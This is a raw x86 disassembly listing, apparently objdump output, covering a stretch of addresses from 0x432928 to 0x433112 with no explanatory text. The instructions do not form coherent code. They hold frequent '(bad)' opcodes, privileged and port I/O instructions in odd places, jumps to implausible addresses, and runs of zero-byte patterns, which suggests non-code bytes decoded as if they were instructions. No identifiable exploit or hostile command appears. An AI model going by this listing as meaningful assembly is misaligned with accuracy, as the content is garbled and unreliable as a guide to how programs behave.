  432928:	in     eax,dx
  432929:	and    esp,edx
  43292b:	dec    edx
  43292c:	popf   
  43292d:	int    0x12
  43292f:	shl    BYTE PTR [edx+0x12a430a5],1
  432935:	leave  
  432936:	ret    
  432937:	aaa    
  432938:	sub    BYTE PTR ds:0xea34687,ch
  43293e:	ins    DWORD PTR es:[edi],dx
  43293f:	mov    dh,BYTE PTR [ecx-0x7edb16f2]
  432945:	and    eax,0x28f9b85c
  43294a:	jb     0x43294b
  43294c:	inc    ebx
  43294d:	xchg   ecx,eax
  43294e:	(bad)  
  43294f:	aas    
  432950:	retf   
  432951:	js     0x43293e
  432953:	add    BYTE PTR [eax],al
  432955:	add    BYTE PTR [eax],al
  432957:	add    BYTE PTR [ebx],bl
  432959:	sub    esi,DWORD PTR [edx-0x142073d7]
  43295f:	aam    0x73
  432961:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432962:	dec    esi
  432963:	jmp    0xd7a45c76
  432968:	pop    esi
  432969:	call   0x57019d80
  43296e:	not    BYTE PTR [esi-0x6a]
  432971:	mov    dl,0xe
  432973:	ins    BYTE PTR es:[edi],dx
  432974:	push   ebx
  432975:	(bad)  
  432976:	adc    esp,DWORD PTR [edx-0x2a]
  432979:	push   esi
  43297a:	xchg   ecx,eax
  43297b:	test   eax,0xc254aafe
  432980:	out    0x5e,al
  432982:	push   0xffffffa2
  432984:	test   BYTE PTR [esi+edx*4+0x24],dh
  432988:	je     0x43296e
  43298a:	jmp    0x432988
  43298c:	fbld   TBYTE PTR [esi+ecx*2-0x1110eb17]
  432993:	jmp    0xea156028
  432998:	xchg   ebx,eax
  432999:	mov    dl,0x8f
  43299b:	les    esi,FWORD PTR [ebx-0x29ae494]
  4329a1:	jno    0x43298e
  4329a3:	jmp    0xe95e9b88
  4329a8:	xchg   ebx,eax
  4329a9:	add    eax,0xa6a0e979
  4329ae:	ss push 0x57
  4329b1:	jb     0x43299f
  4329b3:	cld    
  4329b4:	sti    
  4329b5:	mov    edi,0x61bce94e
  4329ba:	xchg   ebp,eax
  4329bb:	add    BYTE PTR [eax],al
  4329bd:	add    BYTE PTR [eax],al
  4329bf:	add    BYTE PTR [eax],al
  4329c1:	mov    ah,0x1
  4329c3:	xchg   ebx,eax
  4329c4:	idiv   BYTE PTR [esi]
  4329c6:	cmp    al,BYTE PTR [esi+0x3fb63900]
  4329cc:	push   0x29
  4329ce:	push   eax
  4329cf:	jmp    0x432a3a
  4329d1:	and    eax,0x64ff5c7d
  4329d6:	xchg   esi,eax
  4329d7:	call   0x4f08baf1
  4329dc:	add    BYTE PTR [eax+0x7b],dh
  4329df:	fild   DWORD PTR [ebp-0x7cd4d4d7]
  4329e5:	push   esp
  4329e6:	mov    ds:0x888956eb,al
  4329eb:	call   0x4f0bb705
  4329f0:	add    BYTE PTR [edx-0x6],ch
  4329f3:	pop    ss
  4329f4:	mov    DWORD PTR [esi+ebp*4-0x1b],ecx
  4329f8:	call   FWORD PTR [esi]
  4329fa:	mov    bh,BYTE PTR ds:0xe5ae5c8d
  432a00:	dec    DWORD PTR [esi]
  432a02:	iret   
  432a03:	dec    esi
  432a04:	imul   ebp,DWORD PTR [esi],0x1d4d6ca1
  432a0a:	mov    eax,ds:0xf5da0ef4
  432a0f:	sub    eax,ebx
  432a11:	and    bl,BYTE PTR [ebx]
  432a13:	repz cmp DWORD PTR [ecx+eiz*4],0xffffffe8
  432a18:	mov    esp,DWORD PTR [ecx+eax*1-0x17]
  432a1c:	jne    0x4329d7
  432a1e:	mov    eax,ds:0x755a2c02
  432a23:	jmp    0x4329dc
  432a25:	add    BYTE PTR [eax],al
  432a27:	add    BYTE PTR [eax],al
  432a29:	add    BYTE PTR [ecx+0x6d],ch
  432a2c:	jmp    0x432a2d
  432a2e:	pusha  
  432a2f:	ja     0x432a40
  432a31:	je     0x432a72
  432a33:	in     al,dx
  432a34:	inc    edx
  432a35:	fsub   st,st(2)
  432a37:	mov    al,0xf3
  432a39:	push   eax
  432a3a:	cmp    dh,BYTE PTR [ebp-0x5c6f75f2]
  432a40:	pop    es
  432a41:	pavgb  mm5,QWORD PTR [ecx]
  432a44:	cmp    al,0x74
  432a46:	pop    eax
  432a47:	mov    eax,0x1b865c05
  432a4c:	movq   QWORD PTR [edi+edx*2+0x60],mm1
  432a51:	add    BYTE PTR [ebx],cl
  432a53:	ror    DWORD PTR [edx],1
  432a55:	and    ch,bh
  432a57:	push   edi
  432a58:	cmp    al,0x83
  432a5a:	jmp    0x432a62
  432a5c:	push   cs
  432a5d:	sti    
  432a5e:	jge    0x432adb
  432a60:	cmp    al,0x14
  432a62:	jo     0x432ad1
  432a64:	iret   
  432a65:	jmp    DWORD PTR [edi]
  432a67:	pop    edx
  432a68:	or     ch,bh
  432a6a:	mov    eax,ds:0xad34071b
  432a6f:	pop    edx
  432a70:	movsx  ebx,WORD PTR [esi]
  432a73:	ss hlt 
  432a75:	pop    ss
  432a76:	xchg   DWORD PTR [ecx],esi
  432a78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432a79:	jb     0x432a56
  432a7b:	jle    0x432aa5
  432a7d:	xchg   esi,eax
  432a7e:	or     ah,al
  432a80:	jge    0x432a91
  432a82:	call   0xf04f:0x304d3ac2
  432a89:	mov    BYTE PTR [ebp+0x1ae34a],0x0
  432a90:	add    BYTE PTR [eax],al
  432a92:	add    BYTE PTR [ebx-0x3c],bh
  432a95:	dec    esi
  432a96:	test   al,0x6b
  432a98:	sbb    BYTE PTR [edi],ah
  432a9a:	xchg   ebp,eax
  432a9b:	stos   DWORD PTR es:[edi],eax
  432a9c:	enter  0xe4aa,0x77
  432aa0:	pop    ebp
  432aa1:	jnp    0x432b0a
  432aa3:	clc    
  432aa4:	sub    DWORD PTR [esi+edx*4],esp
  432aa7:	pop    ds
  432aa8:	mov    ecx,0xcb5fece6
  432aad:	pop    ecx
  432aae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432aaf:	push   0x350f2880
  432ab4:	js     0x432a5f
  432ab6:	push   esi
  432ab7:	(bad)  
  432ab8:	mov    ecx,0xb27c5eaa
  432abd:	iret   
  432abe:	inc    ecx
  432abf:	inc    eax
  432ac0:	(bad)  
  432ac1:	mov    esi,edi
  432ac3:	sbb    DWORD PTR [eax-0x3e],esi
  432ac6:	jp     0x432aee
  432ac8:	cs pop eax
  432aca:	xchg   dl,bh
  432acc:	pop    ds
  432acd:	cmp    ebp,DWORD PTR [ebp-0x1f]
  432ad0:	mov    BYTE PTR [esi],0xc5
  432ad3:	cmp    BYTE PTR [edi-0x1f],0x38
  432ad7:	push   es
  432ad8:	pop    esp
  432ad9:	xor    ecx,eax
  432adb:	cmp    BYTE PTR [ebx+eax*1+0x2c],bl
  432adf:	iret   
  432ae0:	or     BYTE PTR [eax+0x65],bh
  432ae3:	jmp    0x311d:0xdef9905b
  432aea:	dec    ebp
  432aeb:	mov    eax,ds:0xd554df17
  432af0:	sub    ebx,DWORD PTR [eax+0x14a62abd]
  432af6:	cmp    DWORD PTR [eax],eax
  432af8:	add    BYTE PTR [eax],al
  432afa:	add    BYTE PTR [eax],al
  432afc:	push   es
  432afd:	sub    al,0x3a
  432aff:	mov    WORD PTR [ebx+0x70],?
  432b02:	stos   DWORD PTR es:[edi],eax
  432b03:	dec    ebx
  432b04:	out    0x5b,al
  432b06:	inc    eax
  432b07:	stc    
  432b08:	lods   al,BYTE PTR ds:[esi]
  432b09:	jno    0x432b38
  432b0b:	xor    dl,dl
  432b0d:	pop    ds
  432b0e:	mov    ebp,0x8bdb226c
  432b13:	dec    ebp
  432b14:	mov    cl,0x65
  432b16:	retf   0xa501
  432b19:	aam    0x17
  432b1b:	jge    0x432b3b
  432b1d:	fmul   DWORD PTR [edi]
  432b1f:	sbb    eax,0xe9a2b16
  432b24:	mov    al,ds:0x687d3396
  432b29:	lds    esp,FWORD PTR [esi]
  432b2b:	mov    esi,0xf98056e6
  432b30:	call   0x9d9b:0x373db09b
  432b37:	ror    DWORD PTR [ebx],0xd8
  432b3a:	push   cs
  432b3b:	retf   
  432b3c:	jl     0x432ac6
  432b3e:	pcmpgtd mm5,QWORD PTR [eax-0x5bfbfd2d]
  432b45:	mov    ah,BYTE PTR [esi-0x4c3b5fbc]
  432b4b:	jecxz  0x432b09
  432b4d:	loopne 0x432afe
  432b4f:	ret    0x4878
  432b52:	inc    edx
  432b53:	sub    DWORD PTR [edx+0x48],ebp
  432b56:	not    DWORD PTR [ebx+0x29]
  432b59:	pop    ecx
  432b5a:	sti    
  432b5b:	aad    0x83
  432b5d:	loop   0x432b1d
  432b5f:	cmp    al,0x0
  432b61:	add    BYTE PTR [eax],al
  432b63:	add    BYTE PTR [eax],al
  432b65:	sub    eax,0xad637444
  432b6a:	xor    al,0x6e
  432b6c:	retf   0x8ff0
  432b6f:	repz pop es
  432b71:	mov    ecx,0x463337cc
  432b76:	(bad)  
  432b77:	adc    ecx,DWORD PTR [ebx]
  432b79:	(bad)  
  432b7a:	mov    ebx,ebx
  432b7c:	sti    
  432b7d:	sbb    cl,al
  432b7f:	imul   edi,DWORD PTR [ebx-0x7b08b767],0xb073df8d
  432b89:	(bad)
  432b8c:	dec    edx
  432b8d:	inc    esp
  432b8e:	sub    al,0xbb
  432b90:	pop    ss
  432b91:	xor    esp,edi
  432b93:	xchg   DWORD PTR [ebx],eax
  432b95:	jns    0x432b6a
  432b97:	in     al,dx
  432b98:	sti    
  432b99:	pop    esi
  432b9a:	mov    bh,dh
  432b9c:	dec    esp
  432b9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432b9e:	inc    ebx
  432b9f:	je     0x432bac
  432ba1:	jge    0x432b2b
  432ba3:	cmp    DWORD PTR [esi-0x3d4d7aa8],edi
  432ba9:	add    ebx,0x741ed836
  432baf:	sahf   
  432bb0:	mov    WORD PTR [ebp+0x74],ds
  432bb3:	iret   
  432bb4:	push   0xe2197
  432bb9:	jns    0x432b6d
  432bbb:	imul   esp,DWORD PTR [ebp+ecx*4-0x46],0xe
  432bc0:	push   ebx
  432bc1:	cld    
  432bc2:	xchg   DWORD PTR [eax+0x6a],eax
  432bc5:	xor    eax,0x244fed
  432bca:	add    BYTE PTR [eax],al
  432bcc:	add    BYTE PTR [eax],al
  432bce:	imul   ecx,DWORD PTR [edx-0x71],0xa7b1ed6c
  432bd5:	add    BYTE PTR [ecx],bh
  432bd7:	mov    dl,0xe
  432bd9:	push   eax
  432bda:	mov    dl,0xc8
  432bdc:	xchg   esi,eax
  432bdd:	jl     0x432c3c
  432bdf:	push   esi
  432be0:	call   0x4f0b30fa
  432be5:	add    BYTE PTR [edx-0x1272e80b],ch
  432beb:	push   ebp
  432bec:	aaa    
  432bed:	push   0xfffffff9
  432bef:	xor    BYTE PTR [ecx+0x0],0x61
  432bf3:	mov    dl,0xe
  432bf5:	add    cl,dh
  432bf7:	les    edx,FWORD PTR fs:[eax-0x56]
  432bfb:	dec    esp
  432bfc:	call   0x5795e18a
  432c01:	(bad)  
  432c02:	mov    esp,0xe9401a05
  432c07:	in     al,dx
  432c08:	sti    
  432c09:	mov    DWORD PTR [ebp+0x2f851b52],ebx
  432c0f:	and    ecx,DWORD PTR [eax]
  432c11:	push   edi
  432c12:	mov    ds:0x930074b6,eax
  432c17:	mov    al,0x40
  432c19:	(bad)  
  432c1a:	mov    esp,0xb9401c89
  432c1f:	out    dx,al
  432c20:	dec    edi
  432c21:	and    al,0xbd
  432c23:	xor    ch,BYTE PTR [ebx+0x57eac875]
  432c29:	and    al,0xb9
  432c2b:	leave  
  432c2c:	jb     0x432c29
  432c2e:	neg    BYTE PTR [ecx+0xdb39]
  432c34:	add    BYTE PTR [eax],al
  432c36:	add    ah,dh
  432c38:	sub    ch,BYTE PTR [edi]
  432c3a:	adc    BYTE PTR [eax+0x77f6dcf3],dl
  432c40:	cld    
  432c41:	ins    BYTE PTR es:[edi],dx
  432c42:	mov    esi,0x56d615cf
  432c47:	adc    DWORD PTR [edi+0x5b5fff5e],edx
  432c4d:	push   esp
  432c4e:	push   ecx
  432c4f:	call   0x90829b5f
  432c54:	inc    ecx
  432c55:	jge    0xffc2a367
  432c5b:	aas    
  432c5c:	pop    ebx
  432c5d:	mov    DWORD PTR [ecx],ebx
  432c5f:	loopne 0x432c14
  432c61:	dec    ebx
  432c62:	inc    eax
  432c63:	nop
  432c64:	pop    ebx
  432c65:	xchg   esp,eax
  432c66:	ret    
  432c67:	jl     0x432c3f
  432c69:	push   edx
  432c6a:	je     0x432cb6
  432c6c:	xor    edi,ecx
  432c6e:	dec    edi
  432c6f:	add    eax,0x6043cb17
  432c74:	sbb    DWORD PTR [esi],0x19
  432c77:	xchg   ecx,eax
  432c78:	pop    ebx
  432c79:	in     al,0xc8
  432c7b:	ret    
  432c7c:	sbb    ebp,DWORD PTR [edx+0x4b]
  432c7f:	lods   al,BYTE PTR ds:[esi]
  432c80:	mov    bl,0x93
  432c82:	ret    
  432c83:	pushf  
  432c84:	out    0xb3,al
  432c86:	and    esi,DWORD PTR [eax+0xda64c40]
  432c8c:	lahf   
  432c8d:	out    dx,al
  432c8e:	sbb    eax,DWORD PTR [eax+0xe]
  432c91:	lods   al,BYTE PTR ds:[esi]
  432c92:	and    ecx,DWORD PTR [ebx+ebp*4+0x573a50c1]
  432c99:	les    edx,FWORD PTR [eax+0x0]
  432c9c:	add    BYTE PTR [eax],al
  432c9e:	add    BYTE PTR [eax],al
  432ca0:	popa   
  432ca1:	(bad)  
  432ca2:	imul   esp,DWORD PTR [ebx],0xffffffec
  432ca5:	pop    edx
  432ca6:	sldt   WORD PTR [eax-0x32]
  432caa:	dec    edi
  432cab:	inc    ebx
  432cac:	ins    BYTE PTR es:[edi],dx
  432cad:	mov    ebx,0x5a9fffce
  432cb2:	cmp    BYTE PTR [esp+edx*8],dl
  432cb5:	mov    edi,ecx
  432cb7:	call   DWORD PTR [ebx+esi*4]
  432cba:	xor    eax,0x4ce813fa
  432cbf:	sub    bh,BYTE PTR [edx+0x6c]
  432cc2:	leave  
  432cc3:	fistp  WORD PTR [ebx-0x7c2076c3]
  432cc9:	pop    edx
  432cca:	push   eax
  432ccb:	sub    eax,0x43716c6a
  432cd0:	jecxz  0x432c8d
  432cd2:	and    al,0xaf
  432cd4:	mov    bl,0x92
  432cd6:	cmp    al,0x10
  432cd8:	push   eax
  432cd9:	ret    0x3b5
  432cdc:	(bad)  
  432cdd:	push   0xc
  432cdf:	mov    al,0x3d
  432ce1:	mov    ds:0x96c32a20,al
  432ce6:	stc    
  432ce7:	jle    0x432d4d
  432ce9:	rol    bh,cl
  432ceb:	ret    
  432cec:	daa    
  432ced:	ins    DWORD PTR es:[edi],dx
  432cee:	add    ebp,DWORD PTR [edx]
  432cf0:	mov    ds:0x412ad596,eax
  432cf5:	pop    edx
  432cf6:	mov    cl,0x2a
  432cf8:	or     ch,BYTE PTR [esi+esi*2+0x18]
  432cfc:	mov    ds:0x4f03f5b0,eax
  432d01:	add    eax,0xd12c
  432d06:	add    BYTE PTR [eax],al
  432d08:	add    BYTE PTR [esi+0x437c2887],ah
  432d0e:	xchg   esi,eax
  432d0f:	lock jl 0x432d0a
  432d12:	aaa    
  432d13:	test   al,0x1c
  432d15:	xor    DWORD PTR [eax+0x730c29a4],ecx
  432d1b:	int3   
  432d1c:	jg     0x432d35
  432d1e:	mov    bl,0xf5
  432d20:	add    eax,ebx
  432d22:	repnz icebp 
  432d24:	add    edx,DWORD PTR [eax-0x5f501a4e]
  432d2a:	aaa    
  432d2b:	in     eax,dx
  432d2c:	test   BYTE PTR [eax+0xcfde79d],ch
  432d32:	gs loope 0x432d34
  432d35:	mov    sp,0xff0e
  432d39:	lea    esi,[ebx]
  432d3b:	ficomp WORD PTR [ecx]
  432d3d:	or     eax,0xd4e5f67f
  432d42:	push   0xe6d464eb
  432d47:	enter  0xc26c,0xdf
  432d4b:	dec    esp
  432d4c:	adc    DWORD PTR [eax-0x71],ebx
  432d4f:	add    edi,DWORD PTR [esi+eiz*2+0x200c2cec]
  432d56:	cld    
  432d57:	xchg   edi,eax
  432d58:	mov    bh,0x5f
  432d5a:	add    DWORD PTR [eax-0x387753e4],ebx
  432d60:	es jns 0x432d97
  432d63:	fisub  WORD PTR [edx+eax*4-0x21]
  432d67:	push   eax
  432d68:	fs push eax
  432d6a:	pop    DWORD PTR [esi]
  432d6c:	mov    ecx,0x0
  432d71:	add    BYTE PTR [ebp-0x6c56a3e9],bh
  432d77:	pop    edx
  432d78:	into   
  432d79:	cmp    dh,BYTE PTR [edi+0x68]
  432d7c:	xchg   edx,eax
  432d7d:	sub    eax,esp
  432d7f:	mov    es,WORD PTR [ebx+0x62]
  432d82:	bound  edi,QWORD PTR [esi]
  432d84:	pop    edx
  432d85:	or     eax,0x9b8d5a98
  432d8a:	mov    dh,0x68
  432d8c:	xchg   edx,eax
  432d8d:	test   eax,0x1d99bf27
  432d92:	lock ret 0x1f6
  432d96:	mov    edx,0x276ceb68
  432d9b:	pop    DWORD PTR [esi]
  432d9d:	arpl   WORD PTR [ebx+0x53],cx
  432da0:	arpl   dx,sp
  432da2:	xchg   ebx,eax
  432da3:	mov    dl,0x97
  432da5:	mov    bh,0xab
  432da7:	outs   dx,BYTE PTR ds:[esi]
  432da8:	jge    0x432d48
  432daa:	push   0x8d82cf35
  432daf:	pushf  
  432db0:	into   
  432db1:	fimul  DWORD PTR cs:0xab380048
  432db8:	inc    DWORD PTR [ecx]
  432dba:	test   eax,0xd81abae
  432dbf:	fwait
  432dc0:	push   cs
  432dc1:	add    BYTE PTR [ecx+0x7f],bh
  432dc4:	inc    edx
  432dc5:	push   esi
  432dc6:	inc    esi
  432dc7:	out    0xe6,eax
  432dc9:	mov    ebx,ebx
  432dcb:	xor    al,0x68
  432dcd:	add    DWORD PTR [eax+0x6e],edi
  432dd0:	jmp    0x432dd1
  432dd2:	dec    esi
  432dd3:	jmp    0x432f43
  432dd8:	add    BYTE PTR [eax],al
  432dda:	add    BYTE PTR [ecx-0x4a],bh
  432ddd:	mov    ds:0xeb66130,eax
  432de2:	push   ebx
  432de3:	pop    edx
  432de4:	neg    BYTE PTR [ebx+0x56]
  432de7:	jle    0x432da1
  432de9:	outs   dx,BYTE PTR ds:[esi]
  432dea:	push   ss
  432deb:	stc    
  432dec:	mov    ch,0x74
  432dee:	adc    eax,0x8b0f7bc0
  432df3:	out    0x6c,al
  432df5:	inc    ecx
  432df6:	mov    edi,esi
  432df8:	popa   
  432df9:	pop    ecx
  432dfa:	(bad)  
  432dfb:	mul    BYTE PTR [eax+0x5b]
  432dfe:	(bad)  
  432dff:	out    dx,eax
  432e00:	(bad)
  432e03:	fnsave [ebp+0x63368b0e]
  432e09:	ins    BYTE PTR es:[edi],dx
  432e0a:	in     al,dx
  432e0b:	std    
  432e0c:	out    0x4d,al
  432e0e:	cmp    al,0x82
  432e10:	sub    DWORD PTR [edx+ebp*2],esp
  432e13:	popf   
  432e14:	jl     0x432dac
  432e16:	inc    esi
  432e17:	mov    ecx,0xb6479a84
  432e1c:	jle    0x432db8
  432e1e:	dec    esi
  432e1f:	lods   eax,DWORD PTR ds:[esi]
  432e20:	(bad)  
  432e21:	loope  0x432e5e
  432e23:	jmp    0x3ecac1dd
  432e28:	scas   al,BYTE PTR es:[edi]
  432e29:	push   cs
  432e2a:	add    BYTE PTR [edx-0x75],al
  432e2d:	inc    edi
  432e2e:	push   ss
  432e2f:	imul   ebp,DWORD PTR [esi+0x17908695],0xb5900012
  432e39:	add    cl,BYTE PTR [ebp+0x121d0f]
  432e3f:	add    BYTE PTR [eax],al
  432e41:	add    BYTE PTR [eax],al
  432e43:	add    BYTE PTR [eax-0x377e9a35],dl
  432e49:	pop    ebx
  432e4a:	verr   ax
  432e4d:	fdivr  DWORD PTR ds:0x665f4c7e
  432e53:	and    BYTE PTR [ebx+0x5b],0xf
  432e57:	add    al,ch
  432e59:	pop    ebp
  432e5a:	adc    al,BYTE PTR [eax]
  432e5c:	nop
  432e5d:	sub    esp,DWORD PTR [esi-0x7f]
  432e60:	dec    eax
  432e61:	pop    ebx
  432e62:	sldt   eax
  432e65:	test   al,0x3d
  432e67:	mov    ch,0x8c
  432e69:	pop    edx
  432e6a:	verr   dx
  432e6d:	push   es
  432e6e:	ins    BYTE PTR es:[edi],dx
  432e6f:	aam    0x91
  432e71:	pop    ebx
  432e72:	(bad)  
  432e74:	or     eax,0x900056d9
  432e79:	pop    ebx
  432e7a:	pop    es
  432e7b:	mov    eax,ds:0x850f5b6b
  432e80:	push   eax
  432e81:	pusha  
  432e82:	mov    ds,ebx
  432e84:	nop
  432e85:	pop    ebx
  432e86:	pcmpgtd mm2,QWORD PTR [ecx-0x57dc5932]
  432e8d:	mov    bl,0xfb
  432e8f:	sub    BYTE PTR [edi],al
  432e91:	push   eax
  432e92:	dec    bx
  432e94:	mov    ah,0x5f
  432e96:	pop    es
  432e97:	pop    eax
  432e99:	pop    ebx
  432e9a:	je     0xaaaeb670
  432ea0:	nop
  432ea1:	pop    ebx
  432ea2:	jge    0x6fddb4
  432ea8:	add    BYTE PTR [eax],al
  432eaa:	add    BYTE PTR [eax],al
  432eac:	add    BYTE PTR [eax-0x376699a5],dl
  432eb2:	pop    ebx
  432eb3:	(bad)  
  432eb5:	mov    eax,0xbfe580b1
  432eba:	push   0x3a8a4372
  432ebf:	push   0x3
  432ec1:	nop
  432ec2:	mov    dl,0xd
  432ec4:	add    BYTE PTR [ecx+0x4fd2f5b2],dl
  432eca:	aaa    
  432ecb:	jno    0x432eac
  432ecd:	lds    esi,FWORD PTR [edx-0x5c1ffc0b]
  432ed3:	mov    ch,0xd3
  432ed5:	xlat   BYTE PTR ds:[ebx]
  432ed6:	addr16 jmp 0x45f2:0xf5f28d2b
  432ede:	cs xor eax,0xfed0e7a5
  432ee4:	iret   
  432ee5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432ee6:	push   0xae9cf8a9
  432eeb:	test   BYTE PTR [ebx],0x90
  432eee:	in     eax,0xcf
  432ef0:	repnz pop eax
  432ef2:	shr    DWORD PTR [esi-0x9],1
  432ef5:	xchg   BYTE PTR [ebx],bh
  432ef7:	jns    0x432ed8
  432ef9:	pop    ebp
  432efa:	mov    dl,0xf5
  432efc:	add    ecx,DWORD PTR [ecx]
  432efe:	xor    ebp,ebp
  432f00:	std    
  432f01:	das    
  432f02:	push   0x2f14fb8f
  432f07:	fld    DWORD PTR [ebp-0x70]
  432f0a:	mov    dl,0xf5
  432f0c:	rol    DWORD PTR [ecx+esi*1],cl
  432f0f:	cmc    
  432f10:	std    
  432f11:	add    BYTE PTR [eax],al
  432f13:	add    BYTE PTR [eax],al
  432f15:	add    BYTE PTR [edi],cl
  432f17:	push   0x33dc2685
  432f1c:	mov    ecx,0xf65938f8
  432f21:	add    edx,DWORD PTR [eax-0x7c1fc6cb]
  432f27:	jo     0x432f1e
  432f29:	add    edx,DWORD PTR [eax-0x7]
  432f2c:	sub    ch,BYTE PTR [ebx]
  432f2e:	pop    esi
  432f2f:	push   esi
  432f30:	stc    
  432f31:	imul   edx,DWORD PTR [ebx-0x6c16f14f],0xa76699f8
  432f3b:	scas   al,BYTE PTR es:[edi]
  432f3c:	push   cs
  432f3d:	jmp    0xf5df6625
  432f42:	mov    ch,0x67
  432f44:	jmp    0x432ec7
  432f46:	lea    ebx,[ebp+0x2726e90e]
  432f4c:	popa   
  432f4d:	enter  0x3c18,0xe9
  432f51:	out    0x93,al
  432f53:	mov    dl,0x95
  432f55:	addr16 cwde 
  432f57:	mov    edx,0xb303e90e
  432f5c:	idiv   edx
  432f5e:	xor    BYTE PTR [ebp-0x5b],0x4f
  432f62:	xchg   ebx,eax
  432f63:	mov    dl,0xe
  432f65:	fs push eax
  432f67:	xchg   ebx,eax
  432f68:	add    ah,BYTE PTR [ecx+0x7c]
  432f6b:	repnz push ebp
  432f6d:	mov    esp,0x9ece95a9
  432f72:	dec    ebp
  432f73:	push   es
  432f74:	dec    eax
  432f75:	push   0xe90d63d0
  432f7a:	add    BYTE PTR [eax],al
  432f7c:	add    BYTE PTR [eax],al
  432f7e:	add    BYTE PTR [ebx-0x358dc0d9],dl
  432f84:	cs aad 0x95
  432f87:	in     eax,0xbb
  432f89:	mov    ds:0xce2e0de8,eax
  432f8e:	xchg   ebp,eax
  432f8f:	std    
  432f90:	xchg   edi,eax
  432f91:	rcr    BYTE PTR [esi+0x18f5d98],0x1c
  432f98:	fdivp  st(7),st
  432f9a:	in     eax,0x7c
  432f9c:	repnz adc BYTE PTR [edx-0x4c],ch
  432fa0:	fbld   TBYTE PTR [edx-0x14]
  432fa3:	adc    BYTE PTR [edi+0x46],bl
  432fa6:	push   esp
  432fa7:	test   esp,0x7b913612
  432fad:	inc    ecx
  432fae:	aaa    
  432faf:	or     ch,BYTE PTR [esi-0x2a19ffb7]
  432fb5:	push   ds
  432fb6:	lea    ebp,[edi+0x1836dfe]
  432fbc:	ins    BYTE PTR es:[edi],dx
  432fbd:	pusha  
  432fbe:	or     al,bh
  432fc0:	nop
  432fc1:	jae    0x1f3832b2
  432fc7:	and    al,0x25
  432fc9:	test   al,0x66
  432fcb:	ret    0x60a7
  432fce:	or     al,bh
  432fd0:	nop
  432fd1:	jae    0xf37dbc2
  432fd7:	and    al,0x25
  432fd9:	mov    BYTE PTR [esi+0x42],ah
  432fdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432fdd:	pusha  
  432fde:	(bad)  
  432fe1:	jae    0x432fe7
  432fe7:	add    BYTE PTR [ebx+0x6ac69508],ch
  432fed:	add    ch,BYTE PTR [ebp-0x3f]
  432ff0:	jnp    0x432fbd
  432ff2:	shl    BYTE PTR [esi-0x14],cl
  432ff5:	xchg   edi,eax
  432ff6:	inc    ebp
  432ff7:	pop    ebp
  432ff8:	sbb    eax,0x68cf6bb3
  432ffd:	jmp    0x432fcf
  432fff:	pop    edi
  433000:	mov    al,0xc2
  433002:	inc    ebx
  433003:	ret    
  433004:	mov    edx,0x4169eb52
  433009:	jp     0x43304f
  43300b:	ret    
  43300c:	cld    
  43300d:	jmp    0x12:0xad9581f7
  433014:	cmp    DWORD PTR [ebx+0x78257d91],eax
  43301a:	inc    eax
  43301b:	mov    edx,DWORD PTR [ebx-0x5dcd2116]
  433021:	ja     0x43300b
  433023:	adc    eax,0x4ec435
  433028:	push   0xffffffc6
  43302a:	call   0xd578a3a3
  43302f:	test   al,0x90
  433031:	imul   eax,DWORD PTR [ebx+0x4414f802],0xfffffffc
  433038:	fild   WORD PTR [eax+0x63d7e815]
  43303e:	lldt   WORD PTR [esp+ebx*1]
  433042:	test   DWORD PTR [ebx+0x5e],esp
  433045:	loope  0x43305d
  433047:	add    DWORD PTR [eax+0x8c7e5b],edx
  43304d:	add    BYTE PTR [eax],al
  43304f:	add    BYTE PTR [eax],al
  433051:	rol    BYTE PTR [esi+0x2f],0xfa
  433055:	mov    eax,0xa7ffedd4
  43305a:	push   es
  43305b:	xchg   esi,eax
  43305c:	out    dx,eax
  43305d:	popf   
  43305e:	sub    al,0x2f
  433060:	dec    edi
  433061:	xchg   edi,eax
  433062:	jle    0x4330af
  433064:	push   cs
  433065:	rcr    BYTE PTR [ebx+0x7e],1
  433068:	push   esp
  433069:	mov    BYTE PTR [edx+0x5b7fff05],ah
  43306f:	aaa    
  433070:	cli    
  433071:	cmp    al,BYTE PTR [eax+esi*1]
  433074:	mov    WORD PTR ds:0x67fa0bf3,ss
  43307a:	sub    edi,DWORD PTR [ecx+0x7160cff]
  433080:	dec    edi
  433081:	add    eax,0x4ffc02ce
  433086:	pushf  
  433087:	mov    ds:0xe4b39dfa,al
  43308c:	aas    
  43308d:	nop
  43308e:	(bad)  
  43308f:	push   edx
  433090:	jae    0x43302d
  433092:	inc    ecx
  433093:	adc    cl,BYTE PTR [ebp-0x5f44ceb]
  433099:	daa    
  43309a:	sub    esp,DWORD PTR [ebp-0x1e687a06]
  4330a0:	aas    
  4330a1:	nop
  4330a2:	(bad)  
  4330a3:	jge    0x43308c
  4330a5:	or     ebx,DWORD PTR [eax+esi*1-0x19]
  4330a9:	pop    ds
  4330aa:	push   ebx
  4330ab:	(bad)  
  4330ad:	push   DWORD PTR [ecx+0x7d0f0c4a]
  4330b3:	pusha  
  4330b4:	push   ecx
  4330b5:	add    BYTE PTR [eax],al
  4330b7:	add    BYTE PTR [eax],al
  4330b9:	add    bh,dh
  4330bb:	out    0x94,al
  4330bd:	and    dl,ch
  4330bf:	sub    eax,0x2e7a98b5
  4330c4:	aam    0x98
  4330c6:	mov    WORD PTR [edx],?
  4330c8:	ror    BYTE PTR ds:0xf44dc044,1
  4330ce:	jb     0x433082
  4330d0:	cmc    
  4330d1:	and    ah,BYTE PTR [esi+edi*8+0x66b7c3e6]
  4330d8:	mov    eax,0x84655a2c
  4330dd:	and    dh,BYTE PTR [ebp+0x72]
  4330e0:	nop
  4330e1:	add    eax,0xc234b2e0
  4330e6:	ds jnp 0x4330a0
  4330e9:	or     edx,DWORD PTR [eax-0x290c6ed1]
  4330ef:	std    
  4330f0:	add    edi,DWORD PTR [ebx+0x1c605916]
  4330f6:	loopne 0x43312f
  4330f8:	cli    
  4330f9:	imul   edi,ebx,0xffffffee
  4330fc:	cmc    
  4330fd:	nop
  4330fe:	ret    
  4330ff:	mov    ds,ebp
  433101:	mov    ebx,gs
  433103:	mov    cs,ecx
  433105:	sub    edi,ebp
  433107:	adc    ebp,DWORD PTR [edx]
  433109:	and    dl,BYTE PTR [ebx]
  43310b:	jae    0x4330b6
  43310d:	xchg   ebp,eax
  43310e:	jne    0x433097
  433110:	jb     0x433134
  433112:	les    edx,FWORD PTR [edx-0x718c68cc]
